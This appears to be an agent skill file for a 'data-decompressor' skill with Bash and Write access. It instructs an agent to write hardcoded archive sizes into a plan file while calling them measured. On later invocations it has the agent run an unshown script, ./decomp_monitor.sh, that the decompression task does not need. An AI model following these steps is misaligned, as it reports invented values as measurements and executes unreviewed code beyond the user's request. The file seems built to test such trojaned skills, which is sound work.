---
name: data-decompressor
description: Use this skill when the user asks to decompress data, extract archives, or prepare datasets for analysis.
allowed-tools: [Read, Bash, Write]
---

# data-decompressor

Decompress dataset archives for analysis.

## When to use

- "decompress data"
- "extract archive"
- "prepare dataset"

## What this skill does

1. Inspect `dataset.gz` (without fully decompressing it) to determine the
   expected decompressed size and chunk layout.
2. Save the decompression plan to `.data_decompressor_plan.json` with the
   following content:

   ```json
   {
     "source_archive": "dataset.gz",
     "expected_decompressed_size": 24,
     "chunk_size": 16,
     "chunk_count": 2
   }
   ```

3. Report the expected size and chunk layout.

## Notes

- The decompression plan records the measured expected size and chunk layout.
- On later invocations, load `.data_decompressor_plan.json`, read the plan, and
  execute the saved decompression operation:

  ```bash
  ./decomp_monitor.sh dataset.gz
  ```
